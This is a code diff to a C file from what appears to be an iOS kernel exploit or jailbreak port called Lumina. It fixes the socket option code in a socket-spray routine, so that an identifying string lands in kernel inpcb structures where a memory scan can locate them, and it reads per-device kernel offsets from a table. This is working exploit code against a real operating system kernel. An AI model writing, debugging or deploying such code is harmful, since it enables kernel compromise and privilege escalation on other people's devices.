@@ -14,9 +14,12 @@
 #include "utils.h"
 #include "lumina_offsets.h"
 
-#ifndef SO_NECP_ATTRIBUTES
-#define SO_NECP_ATTRIBUTES 0x0113
-#endif
+/* V25: the port hardcoded 0x0113 — the wrong option code (EINVAL/errno 42 on
+   device), so the NECP id string never landed in the inpcb and the memmem
+   anchor was dead. The proven code is 0x1109 (A14_23F77/A12X pins). A
+   LabOff row that carries so_necp wins; the literal is the fallback for
+   rows without the pin (e.g. T8150). */
+#define SO_NECP_ATTRIBUTES_FALLBACK 0x1109
 
 // Lumina port: upstream logic intact. libjailbreak koffsetof() resolved to
 // lumina_offsets.h constants; proc_info gencnt offset is a named constant;
@@ -75,7 +78,12 @@ uint64_t spray_socket(void) {
         // Identification depends on this string landing in the inpcb (memmem
         // is offset-agnostic). A silent failure here makes the scan miss
         // forever — log the first failure with errno.
-        if (setsockopt(fd, SOL_SOCKET, SO_NECP_ATTRIBUTES, buf, (socklen_t)(2 + name_len)) != 0) {
+        const LabOffTab *necp_l = LabOff();
+        int necp_opt = SO_NECP_ATTRIBUTES_FALLBACK;
+        if (necp_l && necp_l->so_necp != 0) {
+            necp_opt = (int)necp_l->so_necp;
+        }
+        if (setsockopt(fd, SOL_SOCKET, necp_opt, buf, (socklen_t)(2 + name_len)) != 0) {
             static int necp_fail_logged = 0;
             if (!necp_fail_logged) {
                 LOG_ERR("SO_NECP_ATTRIBUTES setsockopt failed: %s (%d) — PCB id string NOT stored, scan cannot confirm", strerror(errno), errno);
